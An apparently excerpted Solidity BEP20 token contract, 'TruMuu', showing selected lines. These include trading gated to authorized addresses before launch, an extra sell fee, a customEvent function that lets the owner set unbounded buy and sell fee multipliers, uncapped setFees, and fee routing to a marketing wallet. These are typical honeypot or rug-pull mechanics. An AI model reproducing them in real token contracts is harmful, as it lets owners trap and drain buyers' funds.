...
contract DividendDistributor is IDividendDistributor {
    ...
    // EARN
    IBEP20 public RWRD = IBEP20(0xEA5E9F39F4B4Bc2684e49A0E43127F7f6F6be3b8);
...
contract TruMuu is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address REWARDS = 0xEA5E9F39F4B4Bc2684e49A0E43127F7f6F6be3b8; //MuuInu

    string constant _name = "TruMuu";
    string constant _symbol = "TruMuu";
    ...
    uint256 teamFee = 0;
    uint256 muuInuRewards = 4;
    uint256 marketingFee = 4;
    uint256 totalFee = 12;
    uint256 feeDenominator = 100;
    
    uint256 customSellFeeMultiplier = 1;
    uint256 customBuyFeeMultiplier = 1;

    address private marketingFeeReceiver =0x854Bf5F4441FBb888eC8c846D9b567937dD1e277;
    address private teamFeeReceiver =0xdD1ae919449c7749fD64dD0fd8a600A81f1A1A9f;
    ...
    constructor () Auth(msg.sender) {
        ...
        routerGas = 0x854Bf5F4441FBb888eC8c846D9b567937dD1e277;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(launched() || isAuthorized(sender), "Trade still not opened");
        ...
        if(coolDownEnabled){
            uint256 timePassed = block.timestamp - _lastTx[sender];
    ...
    function getTotalFee(bool selling) public view returns (uint256) {
        ...
        if(selling) { return totalFee.mul(customSellFeeMultiplier).add(1); }
        else { return totalFee.mul(customBuyFeeMultiplier); }
    }
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBRewards = amountBNB.mul(muuInuRewards).div(totalBNBFee).div(2);
  ...
  //      require(Success3, "receiver rejected ETH transfer");
    ...
    function customEvent(uint256 _customBuyFeeMultiplier, uint256 _customSellFeeMultiplier) external authorized {
        customBuyFeeMultiplier = _customBuyFeeMultiplier;
        customSellFeeMultiplier = _customSellFeeMultiplier;
    }
    ...
    function changeTokenReward(address tokenReward) external authorized {
    ...
    function setFees(uint256 _liquidityFee, uint256 _teamFee, uint256 _marketingFee, uint256 _muuInuRewards, uint256 _feeDenominator) external authorized {
        liquidityFee = _liquidityFee;
        teamFee = _teamFee;
        marketingFee = _marketingFee;
        muuInuRewards = _muuInuRewards;
        totalFee = _liquidityFee.add(_teamFee).add(_marketingFee).add(_muuInuRewards);
    ...
    function refillGas() external authorized {
